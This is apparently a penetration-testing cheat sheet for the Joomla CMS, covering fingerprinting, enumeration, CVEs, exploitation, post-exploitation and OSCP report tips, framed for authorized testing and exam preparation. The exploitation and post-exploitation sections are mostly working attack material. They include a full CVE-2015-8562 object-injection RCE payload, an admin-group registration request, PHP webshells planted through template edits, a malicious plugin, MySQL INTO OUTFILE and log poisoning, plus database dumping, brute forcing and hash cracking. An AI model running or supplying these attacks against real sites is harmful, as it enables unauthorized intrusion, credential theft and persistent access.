# Joomla

> Joomla CMS reference for penetration testing. Covers detection, enumeration,
> known CVEs, exploitation patterns, misconfigurations, and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### HTML markers

```bash
curl -s http://<TARGET>/ | grep -iE 'joomla|/components/|/modules/|/templates/'
```

Expected output:

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
<script src="/media/jui/js/jquery.min.js"></script>
<link rel="stylesheet" href="/templates/protostar/css/template.css" />
<script src="/components/com_content/js/content.js"></script>
```

Strong fingerprints:
- `/components/`, `/modules/`, `/templates/`, `/media/` paths
- `<meta name="generator" content="Joomla! ..." />`
- `/administrator/` admin path
- `/language/en-GB/en-GB.xml` language manifest

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -iE '^(set-cookie|x-content-encoded-by|server)'
```

Expected output:

```text
Set-Cookie: <random-hex>=<value>; path=/; HttpOnly
X-Content-Encoded-By: Joomla! 3.9.14
```

The random hex cookie name (32 chars) is Joomla's session cookie. The
`X-Content-Encoded-By` header sometimes reveals the exact version.

### Default files

- `/administrator/` - admin login page
- `/administrator/manifests/files/joomla.xml` - **version disclosure**
- `/language/en-GB/en-GB.xml` - version
- `/plugins/system/cache/cache.xml` - version in plugin manifest
- `/README.txt` - version in readme
- `/configuration.php` - **never served** but `.bak` / `.old` may leak
- `/htaccess.txt` - sample htaccess (not active)

### robots.txt

```bash
curl -s http://<TARGET>/robots.txt
```

Default Joomla robots.txt reveals paths.

### nmap / whatweb / joomscan

```bash
nmap -sV -p 80,443 --script http-joomla-brute,http-generator <TARGET>
whatweb -a 3 http://<TARGET>/
joomscan -u http://<TARGET>/
```

`joomscan` is the primary enumeration tool:

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan
perl joomscan.pl -u http://<TARGET>/
```

---

## 2. Enumeration

### Version

```bash
# Method 1: administrator manifest
curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | grep -oE '<version>[^<]+</version>'

# Method 2: language XML
curl -s http://<TARGET>/language/en-GB/en-GB.xml | grep -oE '<version>[^<]+</version>'

# Method 3: README.txt
curl -s http://<TARGET>/README.txt | head -20

# Method 4: meta generator
curl -s http://<TARGET>/ | grep -oE 'content="Joomla! [^"]+'

# Method 5: plugins manifest
curl -s http://<TARGET>/plugins/system/cache/cache.xml | grep -oE '<version>[^<]+</version>'
```

### Admin path

Default: `/administrator/`. Sometimes renamed for security.
Brute force common paths:

```bash
for p in administrator admin administrator2 backend manage joomla-admin; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p/")
  echo "$code  /$p/"
done
```

### Component enumeration

```bash
# Common components
for c in com_content com_contact com_users com_weblinks com_newsfeeds \
         com_search com_finder com_tags com_banners com_config; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/index.php?option=$c")
  echo "$code  $c"
done
```

Vulnerable third-party components are the usual entry point:

```bash
for c in com_jce com_fabrik com_k2 com_akeeba com_admintools com_rsform \
         com_djclassifieds com_phocadownload com_jevents com_jdownloads; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/index.php?option=$c")
  echo "$code  $c"
done
```

### Template enumeration

```bash
curl -s http://<TARGET>/ | grep -oE '/templates/[^/]+/' | sort -u
curl -s http://<TARGET>/templates/<template>/templateDetails.xml | grep -oE '<version>[^<]+</version>'
```

### Module enumeration

```bash
curl -s http://<TARGET>/ | grep -oE '/modules/mod_[^/"]+' | sort -u
```

### Plugin enumeration

```bash
for p in authentication/cookie authentication/gmail authentication/joomla \
         content/pagebreak content/emailcloak editors/tinymce editors/codemirror \
         system/cache system/debug system/log; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/plugins/$p/$p.xml")
  echo "$code  $p"
done
```

### User enumeration

Joomla does not directly expose users. Indirect methods:

**1. Contact component:**

```bash
curl -s "http://<TARGET>/index.php?option=com_contact&view=contact&id=1"
```

**2. Author archive via content:**

```bash
curl -s "http://<TARGET>/index.php?option=com_content&view=category&layout=blog&id=1"
```

**3. Registration form errors:**

```bash
curl -s -X POST http://<TARGET>/index.php?option=com_users \
  -d "task=registration.register&jform[username]=admin&jform[email]=test@x.com&jform[password1]=test1&jform[password2]=test1"
# Error messages reveal if username/email exists
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla.txt -x php,txt,xml,bak,old
```

Seclists: `Discovery/Web-Content/CMS/joomla.txt`.

### Backup files

```bash
for f in configuration.php.bak configuration.php.old configuration.php~ \
         configuration.php.save configuration.php.orig htaccess.txt.bak \
         backup.zip backup.tar.gz joomla.zip dump.sql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### /administrator/ error pages

The Joomla admin login reveals version via error pages or JS files:

```bash
curl -s http://<TARGET>/administrator/ | grep -oE 'version[^"]*|Joomla[^<]*'
```

### Common paths

```bash
for p in administrator/manifests/files/joomla.xml \
         language/en-GB/en-GB.xml \
         templates/system/css/system.css \
         media/system/js/mootools-core.js \
         plugins/system/remember/remember.xml; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p")
  echo "$code  $p"
done
```

---

## 3. Known CVEs

Joomla has many CVEs across core and popular extensions. Below are the
high-impact ones.

### Core CVEs

#### CVE-2023-23752 - Unauthenticated information disclosure (Joomla 4)

The webservice API endpoint leaks configuration, including DB credentials,
MySQL user/password, and Joomla secret.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-23752
Affected: Joomla 4.0.0 - 4.2.7.

PoC:

```bash
curl -s "http://<TARGET>/api/index.php/v1/config/application?public=true" | jq .
curl -s "http://<TARGET>/api/index.php/v1/users?public=true" | jq .
```%%

Expected output:

```json
{
  "data": {
    "attributes": {
      "dbtype": "mysqli",
      "host": "localhost",
      "user": "joomla_db_user",
      "password": "joomla_db_password",
      "dbprefix": "jos_",
      "secret": "JOOMLA_SECRET_VALUE"
    }
  }
}
```

Also leaks users (email addresses, usernames).

#### CVE-2015-8562 - Unauthenticated RCE (Joomla 1.5-3.4.5)

Remote code execution via crafted User-Agent header exploiting PHP object
injection in the session handler.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-8562
Affected: Joomla 1.5 - 3.4.5.

PoC (Metasploit):

```text
use exploit/multi/http/joomla_http_header_rce
set RHOSTS <target>
set LHOST <your ip>
run
```

Manual payload:

```bash
curl -H "User-Agent: 123}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:60:\"eval(base64_decode($_SERVER[HTTP_CMD]));JFactory::getConfig();exit;\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}\xf0\xfd\xfd\xfd" \
  -H "Cmd: ZWNobyAiaWQiOw==" \
  http://<TARGET>/
```

#### CVE-2016-8869 / CVE-2016-8870 - User registration privilege escalation

Register with elevated privileges via manipulated POST.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2016-8869
Affected: Joomla 3.4.4 - 3.6.3.

PoC:

```bash
curl -X POST http://<TARGET>/index.php?option=com_users \
  -d "task=registration.register" \
  -d "jform[name]=attacker" \
  -d "jform[username]=attacker" \
  -d "jform[password1]=pwned" \
  -d "jform[password2]=pwned" \
  -d "jform[email1]=a@b.com" \
  -d "jform[email2]=a@b.com" \
  -d "jform[groups][]=7"  # 7 = Administrator
```

#### CVE-2015-7297 - SQL injection in `com_contenthistory`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-7297
Affected: Joomla 3.2.0 - 3.4.4.

#### CVE-2015-7857 - SQL injection in `com_contenthistory` (admin)

NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-7857
Affected: Joomla 1.6.0 - 3.4.4.

#### CVE-2024-21726 - XSS in `com_content`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-21726
Affected: Joomla 4.x < 4.4.3, 5.x < 5.0.3.

### Popular extension CVEs

#### CVE-2022-25315 - OSMap component SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-25315
Affected: OSMap component.

#### com_jce - CVE-2020-35809 file upload

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-35809
Affected: JCE editor < 2.9.2.

#### com_fabrik - multiple CVEs

- CVE-2020-19504 SQLi
- CVE-2021-44333 SQLi

#### com_k2 - CVE-2018-17381 SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-17381

#### com_akeeba - CVE-2014-7220 file disclosure

NVD: https://nvd.nist.gov/vuln/detail/CVE-2014-7220

#### com_phocadownload - CVE-2020-27971 SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-27971

### Version -> CVE quick table (core)

| Version | Type | CVE |
|---------|------|-----|
| 4.0.0-4.2.7 | Info disclosure | CVE-2023-23752 |
| 1.5-3.4.5 | RCE (User-Agent) | CVE-2015-8562 |
| 3.4.4-3.6.3 | Priv esc | CVE-2016-8869 / 8870 |
| 3.2.0-3.4.4 | SQLi | CVE-2015-7297 / 7857 |
| 4.x < 4.4.3, 5.x < 5.0.3 | XSS | CVE-2024-21726 |

---

## 4. Exploitation Patterns

### CVE-2023-23752 (Joomla 4 unauthenticated info disclosure)

Most valuable Joomla CVE for pentesting. Direct DB credential leak.

```bash
# Get DB config
curl -s "http://<TARGET>/api/index.php/v1/config/application?public=true" | jq .

# Get users
curl -s "http://<TARGET>/api/index.php/v1/users?public=true" | jq .

# Get all public endpoints
curl -s "http://<TARGET>/api/index.php/v1/" | jq '.links'
```

After extracting DB creds:

```bash
mysql -h <host> -u <user> -p<password> <database>
```

Then reset admin password:

```sql
UPDATE jos_users SET password = MD5('newpassword') WHERE username = 'admin';
-- OR (Joomla 3.2+ uses bcrypt):
UPDATE jos_users SET password = '$2y$10$...' WHERE username = 'admin';
```

Or via MySQL root access, write a webshell (see section 6).

### CVE-2015-8562 RCE (Joomla 1.5-3.4.5)

```bash
# Metasploit
msfconsole -q -x "use exploit/multi/http/joomla_http_header_rce; set RHOSTS <target>; set LHOST <your>; run"
```

Or use standalone exploit:

```bash
git clone https://github.com/0x3curity/Joomla-3.4.5-RCE
python Joomla-3.4.5-RCE/exploit.py http://<TARGET>/ "id"
```

### SQL injection to admin password reset

For CVE-2015-7297:

```bash
sqlmap -u "http://<TARGET>/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1" \
  --dbms=mysql --level=5 --risk=3 \
  -D joomla_db -T jos_users -C username,password,email --dump
```

Then crack hashes:

```bash
# bcrypt
hashcat -m 3200 joomla_hashes.txt rockyou.txt

# older MD5
hashcat -m 0 joomla_hashes.txt rockyou.txt
```

### Admin login -> template editor RCE

With admin creds:

1. Log in to `/administrator/`.
2. Navigate to `Extensions -> Templates -> Templates -> <template> -> <file>`.
3. Edit any PHP file (e.g. `error.php`, `index.php`).
4. Insert PHP:

```php
<?php system($_GET['cmd']); ?>
```

5. Trigger: `http://<TARGET>/templates/<template>/error.php?cmd=id`

Or use the plugin editor similarly.

### Admin login -> plugin install RCE

1. Package a malicious plugin (ZIP with `<install>` XML).
2. `Extensions -> Manage -> Upload Package File`.
3. Plugin activates on next request.

Metasploit automates this:

```text
use exploit/unix/webapp/joomla_comjce_imgmanager
# Or custom plugin upload module
```

### Authenticated RCE via extension install

Manual plugin:

```bash
# Create plugin structure
mkdir -p evil/
cat > evil/evil.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<extension type="plugin" group="system" method="upgrade">
  <name>Evil</name>
  <version>1.0</version>
  <files>
    <filename plugin="evil">evil.php</filename>
  </files>
</extension>
EOF

cat > evil/evil.php << 'EOF'
<?php
defined('_JEXEC') or die;
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
EOF

zip -r evil.zip evil/

# Upload via admin panel -> Extensions -> Manage -> Upload
```

### SQL injection via components

Many third-party components have SQLi. Test parameters:

```bash
curl "http://<TARGET>/index.php?option=com_k2&view=itemlist&task=tag&tag=test'"
curl "http://<TARGET>/index.php?option=com_fabrik&view=list&listid=1&fabrik___filter=1'"
curl "http://<TARGET>/index.php?option=com_jdownloads&view=download&catid=1'"
```

Run `sqlmap` on each parameter.

### com_jce file upload (CVE-2020-35809)

```bash
# Requires authentication
curl -b "joomla_session=<session>" \
  -F "file=@shell.php" \
  "http://<TARGET>/index.php?option=com_jce&task=editor.upload"
```

### User enumeration via registration

```bash
# Test if admin exists
curl -X POST http://<TARGET>/index.php?option=com_users \
  -d "task=registration.register&jform[username]=admin&jform[email]=test@x.com&jform[password1]=Test1!&jform[password2]=Test1!"
# Response: "Username already in use" -> user exists
```

### Password reset abuse

Joomla reset tokens may be weak or predictable in older versions:

```bash
curl -X POST http://<TARGET>/index.php?option=com_users \
  -d "task=reset.request&jform[email]=admin@target.com"
```

Then brute force the token if space is small.

---

## 5. Misconfigurations

### /administrator/ exposed without HTTPS

```bash
curl -s http://<TARGET>/administrator/ | grep -i 'form'
```

Admin login over HTTP -> credential sniffing.

### Admin path renamed but visible in JS

```bash
curl -s http://<TARGET>/ | grep -oE "'/[a-zA-Z0-9_-]+/administrator'" 
```

### configuration.php exposed

```bash
for f in configuration.php.bak configuration.php.old configuration.php~ configuration.php.save; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

If leaked, it contains DB credentials + secret.

### Joomla version disclosure

```bash
curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | grep -oE '<version>[^<]+</version>'
curl -s http://<TARGET>/language/en-GB/en-GB.xml | grep -oE '<version>[^<]+</version>'
```

Exact version -> CVE mapping.

### Backup files in webroot

```bash
for f in backup.zip backup.tar.gz joomla.zip dump.sql database.sql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Directory listing

```bash
curl -s http://<TARGET>/images/ | grep -i 'index of'
curl -s http://<TARGET>/tmp/ | grep -i 'index of'
curl -s http://<TARGET>/logs/ | grep -i 'index of'
```

### Log files exposed

```bash
curl -s http://<TARGET>/administrator/logs/
curl -s http://<TARGET>/logs/error.php
```

### Debug mode enabled

```bash
curl -s http://<TARGET>/ | grep -i 'debug\|JDEBUG'
```

Error output with stack traces + file paths.

### Missing security headers

```bash
curl -sI http://<TARGET>/ | grep -iE 'x-frame-options|content-security-policy|strict-transport'
```

### registration enabled

```bash
curl -s "http://<TARGET>/index.php?option=com_users&view=registration" | grep -i 'registration'
```

If enabled -> create account -> explore authenticated attack surface.

### com_users misconfig

Check default group for registration:

```bash
# If 'Author' or higher is default -> post-registration elevated access
```

### Weak admin password

```bash
# Brute force via hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:F=Username and password do not match"
```

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>/ | grep -i 'access-control'
```

---

## 6. Post-Exploitation

### Config file location

```bash
cat /var/www/html/configuration.php
```

Key items:

- `$db`, `$user`, `$password`, `$host` -> DB access
- `$secret` -> Joomla secret (session token signing)
- `$dbprefix` -> table prefix (usually `jos_`)
- `$log_path`, `$tmp_path` -> writable paths
- `$mailfrom`, `$fromname` -> contact info
- `$smtpuser`, `$smtppass` -> SMTP creds

### Database access

```bash
mysql -h $host -u $user -p$password $db
```

Dump users:

```sql
SELECT id, username, password, email FROM jos_users;
SELECT user_id, group_id FROM jos_user_usergroup_map;
```

Joomla 3.2+ uses bcrypt for passwords. Older versions use MD5 with salt.

### Cracking Joomla hashes

**bcrypt (Joomla 3.2+):**

```bash
hashcat -m 3200 joomla_hashes.txt rockyou.txt
```

**MD5 (legacy, salted):**

Format: `<32-hex-md5>:<32-hex-salt>` or just `<32-hex-md5>`:

```bash
hashcat -m 10 joomla_md5.txt rockyou.txt  # md5($pass.$salt)
hashcat -m 20 joomla_md5.txt rockyou.txt  # md5($salt.$pass)
hashcat -m 0  joomla_md5.txt rockyou.txt  # plain md5
```

### Joomla secret abuse

`$secret` is used to sign session cookies and password reset tokens. With the
secret, forge tokens:

```bash
# Password reset token forgery (needs user ID + expiry)
# The formula: md5($secret . $user_id . $expiry) truncated + base64
```

### MySQL -> RCE (with root DB creds)

If the MySQL user has `FILE` privilege:

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

Then:

```bash
curl "http://<TARGET>/shell.php?cmd=id"
```

If `secure_file_priv` is set, use alternative paths (webroot of another vhost,
logs).

### Log poisoning -> RCE

Write PHP into Apache/Nginx error log via crafted request, then include via LFI.

```bash
# Write to access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET>/

# If LFI available, include log
curl "http://<TARGET>/index.php?option=com_x&file=/var/log/apache2/access.log&cmd=id"
```

### Admin template RCE

With admin creds, edit a template file via admin panel:

1. `Extensions -> Templates -> Templates`.
2. Click `<template name>` -> `<file>` (e.g. `error.php`).
3. Insert PHP code.
4. Save + trigger.

```bash
curl -b "joomla_admin_session=<session>" \
  "http://<TARGET>/templates/<template>/error.php?cmd=id"
```

### Plugin upload RCE

See section 4.

### Extracting secrets from jos_config

```sql
SELECT * FROM jos_extensions WHERE element LIKE '%stripe%' OR element LIKE '%aws%';
SELECT params FROM jos_extensions WHERE element = 'com_akeeba';
```

Component params often store API keys, SMTP creds, S3 keys.

### Finding writable paths

```bash
find / -path /proc -prune -o -writable -type d -print 2>/dev/null | grep -iE 'joomla|www|html|tmp'
```

Joomla's `tmp/` and `logs/` directories are commonly writable (needed for
component install). Use for phar / payload staging.

### Logs

```bash
ls -la /var/log/apache2/ /var/log/nginx/ 2>/dev/null
tail -n 200 /var/log/apache2/access.log | grep -i administrator
```

### Persistence via plugin

Create a system plugin that runs on every request (see plugin RCE above).

### Joomla-specific privesc to root

```bash
# Check for writable cron
ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for sudo rights
sudo -l
```

Standard Linux privesc applies once you have a shell.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the Joomla version from `/administrator/manifests/files/joomla.xml` OR `/language/en-GB/en-GB.xml` - it proves the exact core version.

> [!IMPORTANT]
> OSCP report: for CVE-2023-23752, screenshot the JSON response from `/api/index.php/v1/config/application?public=true` AND the successful DB login.

> [!IMPORTANT]
> OSCP report: for admin template/plugin RCE, screenshot the edited file content AND the resulting command output.

---

## 8. References

- Joomla official docs - https://docs.joomla.org/
- Joomla security center - https://developer.joomla.org/security-centre.html
- NVD search - https://nvd.nist.gov/vuln/search/results?query=joomla
- JoomScan (OWASP) - https://github.com/OWASP/joomscan
- CVE-2023-23752 writeup - https://vulncheck.com/blog/joomla-for-rce
- CVE-2015-8562 writeup - https://www.exploit-db.com/exploits/38977
- HackTricks - Joomla - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
- PHPGGC - https://github.com/ambionics/phpggc

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
